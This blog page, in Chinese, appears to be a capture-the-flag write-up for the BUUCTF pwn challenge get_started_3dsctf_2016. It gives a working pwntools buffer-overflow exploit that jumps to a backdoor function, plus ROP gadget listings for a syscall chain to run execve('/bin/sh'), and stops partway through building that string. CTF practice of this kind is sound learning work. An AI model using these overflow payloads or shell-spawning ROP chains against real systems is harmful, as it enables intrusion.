@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html
+  lang="zh"
+  dir="ltr"
+  
+><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>【syscall】get_started_3dsctf_2016 - Peter Liu的个人博客</title>
+
+<meta name="generator" content="Hugo Eureka 0.9.3" />
+<link rel="stylesheet" href="https://peterliuzhi.top/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css">
+<script defer src="https://peterliuzhi.top/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload"
+  href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&amp;family=Noto&#43;Serif&#43;SC:wght@400;600;700&amp;display=swap"
+  as="style" onload="this.onload=null;this.rel='stylesheet'">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css"
+   media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js"
+   crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js"
+     crossorigin></script>
+  <script defer src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js"
+     crossorigin></script>
+<link rel="stylesheet" href="https://peterliuzhi.top/css/highlightjs.min.0e3b6ac4177cdecae52d1b2de76aa7a0ce8a92e4cc23ef2f8691f0218a25f5d328e14bf47be023009535efe940980954.css" media="print" onload="this.media='all';this.onload=null">
+
+
+
+<script src="https://kit.fontawesome.com/99649a0b4d.js" crossorigin="anonymous"></script>
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"
+   integrity="sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ"  media="print"
+  onload="this.media='all';this.onload=null" crossorigin>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js" 
+  integrity="sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY"  crossorigin></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js"
+   integrity="sha384-&#43;XBljXPPiv&#43;OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR"  crossorigin></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\[", right: "\\]", display: true }
+      ],
+    });
+  });
+</script>
+
+
+<script defer src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js" 
+  integrity="sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0"  crossorigin></script>
+
+
+
+<link rel="icon" type="image/png" sizes="32x32" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_32x32_fill_q75_box_center.jpg">
+<link rel="apple-touch-icon" sizes="180x180" href="https://peterliuzhi.top/images/selficon_hu7999937fb0799ea2efe2916a84368012_9703_180x180_fill_q75_box_center.jpg">
+
+<meta name="description"
+  content="BUUCTF get_started_3dsctf_2016的解析">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+      "@type": "ListItem",
+      "position": 1 ,
+      "name":"Writeups",
+      "item":"https://peterliuzhi.top/writeup/"},{
+      "@type": "ListItem",
+      "position": 2 ,
+      "name":"【syscall】get_started_3dsctf_2016",
+      "item":"https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/"}]
+}
+</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/"
+    },
+    "headline": "【syscall】get_started_3dsctf_2016 - Peter Liu的个人博客","datePublished": "2022-12-29T03:01:44+08:00",
+    "dateModified": "2022-12-29T03:01:44+08:00",
+    "wordCount":  2828 ,
+    "publisher": {
+        "@type": "Person",
+        "name": "Peter Liu",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://peterliuzhi.top/images/selficon.jpg"
+        }
+        },
+    "description": "BUUCTF get_started_3dsctf_2016的解析"
+}
+</script><meta property="og:title" content="【syscall】get_started_3dsctf_2016 - Peter Liu的个人博客" />
+<meta property="og:type" content="article" />
+
+
+<meta property="og:image" content="https://peterliuzhi.top/images/selficon.jpg">
+
+
+<meta property="og:url" content="https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/" />
+
+
+
+<meta property="og:description" content="BUUCTF get_started_3dsctf_2016的解析" />
+
+
+
+<meta property="og:locale" content="zh" />
+
+
+
+
+<meta property="og:site_name" content="Peter Liu的个人博客" />
+
+
+
+
+
+
+<meta property="article:published_time" content="2022-12-29T03:01:44&#43;08:00" />
+
+
+<meta property="article:modified_time" content="2022-12-29T03:01:44&#43;08:00" />
+
+
+
+<meta property="article:section" content="writeup" />
+
+
+<meta property="article:tag" content="pwn" />
+
+<meta property="article:tag" content="syscall" />
+
+
+
+
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" />
+
+<meta property="og:see_also" content="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" />
+
+
+
+
+  <body class="flex min-h-screen flex-col">
+    <header
+      class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"
+    >
+      <div class="mx-auto w-full max-w-screen-xl"><style>
+.search-container {
+  margin-top: -0.3rem;
+  margin-right: 1rem;
+}
+.search-container .search {
+  border: 1px solid #e2e8f0;
+  border-radius: 4px;
+}
+.search-container input {
+  padding-left: 1rem;
+  line-height: 2rem;
+  outline: none;
+  background: transparent;
+}
+.search-container button {
+  font-size: 0.8rem;
+  margin-right: 0.5rem;
+  color: #e2e8f0;
+}
+</style>
+<script>
+    let storageColorScheme = localStorage.getItem("lightDarkMode")
+    if (((storageColorScheme == 'Auto' || storageColorScheme == null) && window.matchMedia("(prefers-color-scheme: dark)").matches) || storageColorScheme == "Dark") {
+        document.getElementsByTagName('html')[0].classList.add('dark')
+    }
+</script>
+<nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0">
+    <a href="/" class="me-6 text-primary-text text-xl font-bold">Peter Liu的个人博客</a>
+    <button id="navbar-btn" class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <div id="target"
+        class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20">
+        <div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0">
+            <a href="/#about" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">About</a>
+            <a href="/posts/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Posts</a>
+            <a href="/writeup/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  selected-menu-item  me-4">WriteUp</a>
+            <a href="/tricks/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Tricks</a>
+            <a href="/archive/" class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2  border-transparent  me-4">Archive</a>
+        </div>
+
+        <div class="flex">
+            <div class="search-container relative pt-4 md:pt-0">
+                <div class="search">
+                    <form role="search" class="search-form" action="/search.html" method="get">
+                    <label>
+                        <input name="q" type="text" placeholder="搜索 ..." class="search-field">
+                    </label>
+                    <button>
+                        <i class="fa-solid fa-magnifying-glass"></i>
+                    </button>
+                    </form>
+                </div>
+            </div>
+
+        <div class="flex">
+            <div class="relative pt-4 md:pt-0">
+                <div class="cursor-pointer hover:text-eureka" id="lightDarkMode">
+                    <i class="fas fa-adjust"></i>
+                </div>
+                <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id="is-open">
+                </div>
+                <div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40"
+                    id='lightDarkOptions'>
+                    <span class="px-4 py-1 hover:text-eureka" name="Light">浅色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Dark">深色</span>
+                    <span class="px-4 py-1 hover:text-eureka" name="Auto">自动</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id="is-open-mobile">
+    </div>
+
+</nav>
+<script>
+    
+    let element = document.getElementById('lightDarkMode')
+    if (storageColorScheme == null || storageColorScheme == 'Auto') {
+        document.addEventListener('DOMContentLoaded', () => {
+            window.matchMedia("(prefers-color-scheme: dark)").addEventListener('change', switchDarkMode)
+        })
+    } else if (storageColorScheme == "Light") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'sun')
+        element.firstElementChild.classList.add('fa-sun')
+    } else if (storageColorScheme == "Dark") {
+        element.firstElementChild.classList.remove('fa-adjust')
+        element.firstElementChild.setAttribute("data-icon", 'moon')
+        element.firstElementChild.classList.add('fa-moon')
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        getcolorscheme();
+        switchBurger();
+    });
+</script>
+</div>
+    </header>
+    <main class="grow pt-16">
+        <div class="pl-scrollbar">
+          <div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8">
+  
+  
+  <div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12">
+    <div
+      class=" bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"
+    >
+      <article class="prose">
+  <h1 class="mb-4">【syscall】get_started_3dsctf_2016</h1>
+
+  <div
+  class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"
+>
+  <div class="me-6 my-2">
+    <i class="fas fa-calendar me-1"></i>
+    <span
+      >Thursday, December 29, 2022</span
+    >
+  </div>
+  <div class="me-6 my-2">
+    <i class="fas fa-clock me-1"></i>
+    <span>6分钟阅读时长</span>
+  </div>
+
+  
+    <div class="me-6 my-2">
+      <i class="fas fa-folder me-1"></i>
+      
+        <a href="https://peterliuzhi.top/categories/writeup/" class="hover:text-eureka"
+          >writeup</a
+        >
+      
+    </div>
+  
+
+  
+</div>
+
+
+  
+  
+
+  <h1 id="syscallwrite-upbuuctf-get_started_3dsctf_2016">【syscall】【Write-up】BUUCTF Get_started_3dsctf_2016</h1>
+<p><a href="https://buuoj.cn/challenges#get_started_3dsctf_2016">原题链接</a></p>
+<blockquote>
+<p>在做题前，我先为其建立了一个专门的工作目录：
+<img src="../../image/202209062206042022-09-06-22-06-04.png" alt="202209062206042022-09-06-22-06-04"></p>
+</blockquote>
+<ul>
+<li><a href="#syscallwrite-upbuuctf-get_started_3dsctf_2016">【syscall】【Write-up】BUUCTF Get_started_3dsctf_2016</a>
+<ul>
+<li><a href="#checksec-%E6%9F%A5%E7%9C%8B%E6%9E%B6%E6%9E%84">checksec 查看架构</a></li>
+<li><a href="#ida-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E4%BC%AA%E4%BB%A3%E7%A0%81">ida 查看程序（伪）代码</a>
+<ul>
+<li><a href="#main-%E5%87%BD%E6%95%B0">main 函数</a></li>
+<li><a href="#%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0">后门函数</a></li>
+</ul>
+</li>
+<li><a href="#%E6%9E%84%E5%BB%BA-exp">构建 exp</a>
+<ul>
+<li><a href="#%E9%80%9A%E8%BF%87%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%E6%9E%84%E5%BB%BA-exp">通过后门函数构建 exp</a>
+<ul>
+<li><a href="#%E5%AE%8C%E6%95%B4-exp1">完整 exp1</a></li>
+</ul>
+</li>
+<li><a href="#%E9%80%9A%E8%BF%87-syscall-%E6%9E%84%E5%BB%BA-exp">通过 syscall 构建 exp</a>
+<ul>
+<li><a href="#%E6%B2%A1%E6%9C%89%E7%8E%B0%E6%88%90binsh%E6%9E%84%E5%BB%BA%E5%AD%97%E7%AC%A6%E4%B8%B2">没有现成<code>&quot;/bin/sh&quot;</code>：构建字符串</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4-exp2">完整 exp2</a></li>
+<li><a href="#%E4%B8%80%E4%BA%9B%E6%82%AC%E8%80%8C%E6%9C%AA%E5%86%B3%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98">一些悬而未决的小问题</a>
+<ul>
+<li><a href="#%E4%BD%9C%E8%80%85%E8%AF%95%E5%9B%BE%E4%B8%8D%E4%BD%BF%E7%94%A8pop-edxpop-ecxpop-ebxret%E5%8F%AA%E4%BD%BF%E7%94%A8pop-edxret">作者试图不使用<code>pop edx;pop ecx;pop ebx;ret</code>只使用<code>pop edx;ret</code></a></li>
+<li><a href="#%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E5%85%B6%E4%BB%96%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6">无法执行其他二进制文件</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="checksec-查看架构">checksec 查看架构</h2>
+<p><img src="../../image/202209062207232022-09-06-22-07-23.png" alt="202209062207232022-09-06-22-07-23"></p>
+<p>看来是 32 位的程序。我们首先就要想到，32 位程序的参数传递方式和 64 位程序的是不一样的：</p>
+<ul>
+<li>32 位将参数从右到左先后压入栈中</li>
+<li>64 位程序将参数分别用 RDI,RSI,RCX,RDX,R8,R9 作为第 1-6 个参数，用 RAX 保存返回值</li>
+</ul>
+<p>所以，我们调用 system 函数的思路就不一样了。我们就不需要 pop rdi;ret 这个 gadget（在 32 位程序中也找不到），而是只需要注意用 ret 这个 gadget 保持栈返回时最后一位为 0 即可（system 特殊规定），<a href="https://blog.csdn.net/qq_29328443/article/details/107232025">可以参考这里</a></p>
+<p>但是如果程序很好心地为我们提供了后门函数，那上面的这些也不用考虑了</p>
+<p>同时，我们要注意 32 位程序由于参数保存在栈中，call 的同时还会将【下一条指令的偏移】压入栈中，因此我们要为【下一条指令的偏移】预留出位置</p>
+<h2 id="ida-查看程序伪代码">ida 查看程序（伪）代码</h2>
+<h3 id="main-函数">main 函数</h3>
+<p><img src="../../image/202209062217032022-09-06-22-17-04.png" alt="202209062217032022-09-06-22-17-04"></p>
+<p>看来是简单的栈溢出</p>
+<p>值得注意的是，这里有一个小坑，即 printf 和 puts 的区别。</p>
+<p>printf 在调用完后并不会马上打印出字符串，而是等待刷新缓冲区的指令之后才显示字符串。在这里就体现为，到 gets 函数向用户请求输入时，还没有任何字符串显示。</p>
+<p>因此，可能有人会在写 exp 的时候，一直等待字符串输出，看一直没反应还以为自己 payload 写错了（</p>
+<p>具体的 printf 和 puts 的区别可以看<a href="https://www.cnblogs.com/fanzhidongyzby/p/3519838.html">这位大佬的博文</a>，非常详细</p>
+<h3 id="后门函数">后门函数</h3>
+<p><img src="../../image/202209062232592022-09-06-22-32-59.png" alt="202209062232592022-09-06-22-32-59"></p>
+<p>然后我们就发现了程序好心为我们提供的后门函数（</p>
+<p>只要我们传入参数分别为 814536271 和 425138641，那么我们就能得到 flag 的内容</p>
+<h2 id="构建-exp">构建 exp</h2>
+<h3 id="通过后门函数构建-exp">通过后门函数构建 exp</h3>
+<p>步骤如下：</p>
+<ol>
+<li>首先我们要找到 offset 溢出到 return 的栈地址，这通过 ida 很容易发现<img src="../../image/202209062236332022-09-06-22-36-34.png" alt="202209062236332022-09-06-22-36-34"></li>
+<li>然后我们就将后门函数地址和参数值填入栈中即可</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># pg = p32</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mh">0x80489a0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">814536271</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">425138641</span><span class="p">)</span>
+</span></span></code></pre></div><p>然后直接 sendline 就 🆗 啦</p>
+<h4 id="完整-exp1">完整 exp1</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p64</span><span class="p">,</span> <span class="n">p32</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pss</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">fn</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;./get_started_3dsctf_2016&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_name</span><span class="p">:</span><span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;25191&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">if_32</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">pg</span> <span class="o">=</span> <span class="n">p32</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="n">p64</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;i386&#34;</span> <span class="k">if</span> <span class="n">if_32</span> <span class="k">else</span> <span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">pss</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">fn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mh">0x80489a0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">814536271</span><span class="p">)</span> <span class="o">+</span> <span class="n">pg</span><span class="p">(</span><span class="mi">425138641</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><h3 id="通过-syscall-构建-exp">通过 syscall 构建 exp</h3>
+<p>我们通过 ida 可以得知，该程序 plt 表内没有 system 函数也没有 execve 函数，同时此题又是静态编译，就不能适用 ret2libc 的方法从 libc 中找到 system。</p>
+<p>但是我们可以通过程序中断时产生的系统调用来执行 execve 这个中断程序</p>
+<p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">全部中断程序编号见此</a></p>
+<p>这里我们只需要找到 59 号中断程序，向它传参即可</p>
+<p>64 位编号是 59，也就是 0x3b</p>
+<p><img src="../../image/202209062254342022-09-06-22-54-35.png" alt="202209062254342022-09-06-22-54-35"></p>
+<p>32 位编号是 11，也就是 0xb。</p>
+<p><img src="../../image/202209062255302022-09-06-22-55-30.png" alt="202209062255302022-09-06-22-55-30"></p>
+<p>同时，因为我们的程序是 32 位的，我们需要将编号传给 eax 寄存器，剩余参数分别传入 ecx,edx,esi,edi,ebp 中</p>
+<p><img src="../../image/202209062259352022-09-06-22-59-35.png" alt="202209062259352022-09-06-22-59-35"></p>
+<p>然后，我们要找到这几个参数对应的值。execve 函数后两个参数可以不管设为 0，但是第一个参数应该是<code>/bin/sh</code>或者<code>sh</code></p>
+<p>为了将这几个参数送入寄存器中，我们还需要一个 gadget，不仅可以完成任务，还可以通过<code>ret</code>指令接着读下一条指令</p>
+<p>我们用<code>ROPgadget --binary get_started_3dsctf_2016 --only &quot;pop|ret&quot; | grep eax</code>找 gadget：</p>
+<p>比较遗憾的是，没有刚刚好的 gadget，但是有一条勉强可用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">0x080b91e6 : pop eax <span class="p">;</span> ret
+</span></span></code></pre></div><p>那我们继续找 ebx、ecx、edx：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$ROPgadget</span> --binary get_started_3dsctf_2016 --only <span class="s2">&#34;pop|ret&#34;</span> <span class="p">|</span> grep ebx
+</span></span><span class="line"><span class="cl">0x0809e102 : pop ds <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0809e0fa : pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0805bf3d : pop ebp <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0809e4c4 : pop ebx <span class="p">;</span> pop ebp <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0809a7dc : pop ebx <span class="p">;</span> pop edi <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0806fc09 : pop ebx <span class="p">;</span> pop edx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0804f460 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop ebp <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x080483b7 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x080a25b6 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret 0x10
+</span></span><span class="line"><span class="cl">0x08096b1e : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret 0x14
+</span></span><span class="line"><span class="cl">0x080718b1 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret 0xc
+</span></span><span class="line"><span class="cl">0x0804ab66 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret <span class="m">4</span>
+</span></span><span class="line"><span class="cl">0x08049a95 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret <span class="m">8</span>
+</span></span><span class="line"><span class="cl">0x080509a5 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x080498af : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret <span class="m">4</span>
+</span></span><span class="line"><span class="cl">0x08049923 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x080481ad : pop ebx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x080d413c : pop ebx <span class="p">;</span> ret 0x6f9
+</span></span><span class="line"><span class="cl">0x08099f96 : pop ebx <span class="p">;</span> ret <span class="m">8</span>
+</span></span><span class="line"><span class="cl">0x0806fc31 : pop ecx <span class="p">;</span> pop ebx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x08063adb : pop edi <span class="p">;</span> pop esi <span class="p">;</span> pop ebx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0806fc30 : pop edx <span class="p">;</span> pop ecx <span class="p">;</span> pop ebx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0809e0f9 : pop es <span class="p">;</span> pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0807b1b0 : pop es <span class="p">;</span> pop ebx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0806fc08 : pop esi <span class="p">;</span> pop ebx <span class="p">;</span> pop edx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0805d090 : pop esi <span class="p">;</span> pop ebx <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0805b8a0 : pop esp <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0809efe2 : pop ss <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret
+</span></span></code></pre></div><p>其中，有一条一下子就能同时设置三个需要用的寄存器：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">0x0806fc30 : pop edx <span class="p">;</span> pop ecx <span class="p">;</span> pop ebx <span class="p">;</span> ret
+</span></span></code></pre></div><ol>
+<li>那现在我们的栈从低到高就应该是 eax-&gt;edx-&gt;ecx-&gt;ebx</li>
+<li>然后我们需要找到<code>int 0x80</code>这个 32 位系统调用 system call 的中断指令（64 位就是 syscall）：<code>0x0806d7e5 : int 0x80</code></li>
+<li>然后我们需要找到填入 ebx 寄存器的<code>/bin/sh</code>。结果是没有<code>/bin/sh</code></li>
+</ol>
+<blockquote>
+<p>PS.这里不能直接找<code>sh</code>字符串，因为 execve 函数第一个参数是 path，必须是绝对地址，而且必须是二进制文件（或者脚本文件，但是只会执行<code>!#</code>之后的那个解释器）。在 Linux 系统种的<code>sh</code>命令是软链接，并不是二进制文件</p>
+<p>具体可以查看<a href="https://blog.csdn.net/chichoxian/article/details/53486131">这篇博客</a>，<a href="https://introspelliam.github.io/2017/08/07/pwn/linux%E4%B8%8Bsystem-execve-execl-%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/">这篇博客</a>也很不错</p>
+</blockquote>
+<h4 id="没有现成binsh构建字符串">没有现成<code>&quot;/bin/sh&quot;</code>：构建字符串</h4>
+<p>这题是静态链接，没法 ret2libc。</p>
+<p>但是，我们可以找一处没有用到的地址，利用一些 gadget 将我们需要的值写进去，然后我们就得到了一个程序可以使用的&quot;/bin/sh&quot;字符串地址！</p>
+<p>首先我们需要一条指令，支持我们向内存中写入值，这样我们就可以 pop 栈中的值到寄存器，再将空闲内存的地址赋给另一个寄存器，这样就可以向空闲地址写入值了</p>
